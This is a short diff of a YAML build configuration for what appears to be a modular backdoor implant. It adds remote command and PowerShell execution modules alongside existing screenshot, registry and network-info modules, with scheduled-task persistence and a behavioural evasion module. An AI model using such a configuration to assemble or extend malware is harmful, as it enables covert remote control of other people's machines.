@@ -17,9 +17,13 @@ commands:
   - commands/cmd_screenshot
   - commands/cmd_registry
   - commands/cmd_netinfo
+  - commands/cmd_exec
+  - commands/cmd_exec_powershell
 
 arch: arch/backdoor
 persist: persist/scheduled_task
+
+resources: true
 
 evasion:
   - evasion/behavioral_pacing
